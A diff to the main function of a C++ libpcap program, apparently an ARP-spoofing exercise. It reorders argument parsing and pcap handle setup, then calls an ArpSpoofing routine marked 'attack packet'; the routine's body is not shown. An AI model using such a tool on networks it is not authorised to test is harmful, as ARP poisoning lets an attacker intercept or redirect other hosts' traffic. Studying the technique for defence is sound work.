@@ -261,33 +261,40 @@ int main(int argc, char* argv[]) {
         usage();
         return -1;
     }
-
     char* dev = argv[1];
-    Ip s_ip(argv[2]);
-    Ip t_ip(argv[3]);
 
-    EthArpPacket packet;
-
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-    if (handle == nullptr) {
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
-    }
-
-    char errbuf_2[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
-
-    Mac MAC_SOURCE;
-    Mac MAC_GATEWAY;
     Mac MAC_ADD;
     Ip IP_ADD;
 
     //MAC_ADD , IP_ADD is my mac & ip
     GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);
 
+    //start arp-spoofing for sender-target set
+    Ip s_ip(argv[2]);
+    Ip t_ip(argv[3]);
+
+    //pcap for getpacket
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (pcap == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
+
+    //pcap for sendpacket
+    char errbuf_2[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf_2);
+        return -1;
+    }
+
+    Mac MAC_SOURCE;
+    Mac MAC_TARGET;
+
+
     //attack packet
-    ArpSpoofing(pcap, handle, IP_ADD, s_ip, t_ip, &MAC_ADD, &MAC_SOURCE, &MAC_GATEWAY);
+    ArpSpoofing(pcap, handle, IP_ADD, s_ip, t_ip, &MAC_ADD, &MAC_SOURCE, &MAC_TARGET);
 
     pcap_close(pcap);
     pcap_close(handle);
